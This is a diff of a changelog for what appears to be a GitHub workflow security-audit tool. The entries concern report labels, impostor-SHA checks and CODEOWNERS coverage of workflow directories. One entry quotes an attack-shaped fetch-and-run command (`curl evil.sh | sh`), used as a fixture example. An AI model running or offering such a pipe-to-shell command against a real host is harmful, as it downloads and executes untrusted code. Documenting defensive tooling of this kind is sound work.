@@ -6,21 +6,6 @@ entries are dated (UTC). Format loosely follows
 
 ## [Unreleased]
 
-### Fixed
-
-- **2026-08-07** — **The report no longer contradicts itself about the GitHub
-  API.** A run where the impostor-SHA check ran printed `✅ P14.11
-  impostor-SHA check: ran` and, further down, a Data-sources row reading
-  `GitHub API | not queried`. That row only ever described the run-activity
-  (dormancy) lookup, which needs `--repo`; its label said "GitHub API"
-  unqualified. The row is now `GitHub API — run activity`, with the status
-  spelling out `not queried (no --repo)`.
-- **2026-08-07** — **An attack-shaped host literal in a fixture and in the
-  catalog** (`curl evil.sh | sh`) used a registrable ccTLD, the shape a
-  registry security scan reads as a live indicator of compromise. Both now use
-  an RFC-reserved host. An eval fixture's install URL moved to a reserved
-  domain for the same reason.
-
 ### Changed
 
 - **2026-08-07** — **The `pull-requests: write` vector is described by what it
@@ -63,6 +48,26 @@ entries are dated (UTC). Format loosely follows
 
 ### Fixed
 
+- **2026-08-07** — **A CODEOWNERS rule that owns only some workflows no longer
+  counts as covering the directory.** A restricted glob such as
+  `.github/workflows/*release*.yml` owns the release workflows and leaves every
+  sibling merging on the same approvals as any other change, but the hygiene
+  check read it as directory-wide coverage — the same false clean as a
+  single-file rule, one step removed. The accepted glob shapes are now
+  enumerated (`*`, `**`, `**/*`, with an optional extension suffix); a glob
+  carrying any other literal text in the filename fails.
+- **2026-08-07** — **The report no longer contradicts itself about the GitHub
+  API.** A run where the impostor-SHA check ran printed `✅ P14.11
+  impostor-SHA check: ran` and, further down, a Data-sources row reading
+  `GitHub API | not queried`. That row only ever described the run-activity
+  (dormancy) lookup, which needs `--repo`; its label said "GitHub API"
+  unqualified. The row is now `GitHub API — run activity`, with the status
+  spelling out `not queried (no --repo)`.
+- **2026-08-07** — **An attack-shaped host literal in a fixture and in the
+  catalog** (`curl evil.sh | sh`) used a registrable ccTLD, the shape a
+  registry security scan reads as a live indicator of compromise. Both now use
+  an RFC-reserved host. An eval fixture's install URL moved to a reserved
+  domain for the same reason.
 - **2026-08-07** — **A CODEOWNERS rule for one workflow file no longer counts
   as covering the directory.** The hygiene row asserts that workflow changes
   need a named reviewer; the match was a bare `.github/workflows/` prefix, so
